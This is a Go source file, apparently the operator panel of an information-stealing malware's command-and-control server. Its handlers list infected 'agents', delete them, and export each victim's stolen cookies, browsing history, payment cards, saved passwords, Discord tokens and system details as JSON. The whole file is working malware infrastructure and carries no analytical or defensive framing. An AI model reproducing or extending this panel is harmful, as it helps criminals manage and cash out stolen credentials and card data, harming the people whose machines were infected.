package user

import (
	"os"
	"path"
	"server/global"
	"server/lang"
	"server/lib"

	"github.com/gofiber/fiber/v2"
)

func GetAgents() []global.TAgent {
	var reversed []global.TAgent
	for i := len(global.Agents) - 1; i >= 0; i-- {
		reversed = append(reversed, global.Agents[i])
	}
	return reversed
}

func RenderHome(c *fiber.Ctx, errm string, sucm string) error {
	var size int64 = 0
	var entries []os.DirEntry
	st, err := os.Stat("db/agents.json")
	if err != nil {
		goto CONT
	}
	size = st.Size()

	entries, err = os.ReadDir("db/files")
	if err != nil {
		goto CONT
	}

	for _, e := range entries {
		fp := path.Join("db/files", e.Name())
		st, err := os.Stat(fp)
		if err != nil {
			continue
		}
		size += st.Size()
	}

CONT:
	return lib.Render(c, "home", fiber.Map{
		"agents":  GetAgents(),
		"counts":  len(global.Agents),
		"success": sucm,
		"error":   errm,
		"data":    size,
	})
}

func ConRemove(c *fiber.Ctx) error {
	id := c.Params("id")
	for i, a := range global.Agents {
		if id == a.ID {
			for _, f := range a.Files {
				fp := path.Join("db", "files", f.Data)
				os.Remove(fp)
			}
			global.Agents = append(global.Agents[:i], global.Agents[i+1:]...)
			lib.SaveDB("agents", global.Agents)
			return RenderHome(c, "", lang.GetLang("home.remove.success"))
		}
	}

	return RenderHome(c, lang.GetLang("home.remove.fail"), "")
}

func ConDownload(c *fiber.Ctx) error {
	id := c.Params("id")
	var agent global.TAgent = global.TAgent{
		ID: "0",
	}

	for _, a := range global.Agents {
		if id == a.ID {
			agent = a
			break
		}
	}

	if agent.ID == "0" {
		return RenderHome(c, "", lang.GetLang("home.download.fail"))
	}

	agentcp := struct {
		ID       string             `json:"id"`
		Build    string             `json:"build"`
		System   global.TSystemInfo `json:"system"`
		Cookies  []global.TCookie   `json:"cookies"`
		History  []global.THistory  `json:"history"`
		Cards    []global.TCard     `json:"cards"`
		Password []global.TPassword `json:"password"`
		Discord  []global.TDiscord  `json:"discord"`
	}{
		ID:       agent.ID,
		Cards:    agent.Card,
		Build:    agent.Token,
		System:   agent.Sysinfo,
		Cookies:  agent.Cookie,
		History:  agent.History,
		Discord:  agent.Discord,
		Password: agent.Password,
	}
	return c.JSON(agentcp)
}

func Con(c *fiber.Ctx) error {
	id := c.Params("id")
	var agent global.TAgent = global.TAgent{
		ID: "0",
	}

	for _, a := range global.Agents {
		if id == a.ID {
			agent = a
			break
		}
	}

	if agent.ID == "0" {
		return RenderHome(c, lang.GetLang("home.remove.fail"), "")
	}

	return lib.Render(c, "connection", fiber.Map{
		"build": lib.GetBuild,
		"a":     agent,
	})
}

func Home(c *fiber.Ctx) error {
	return RenderHome(c, "", "")
}
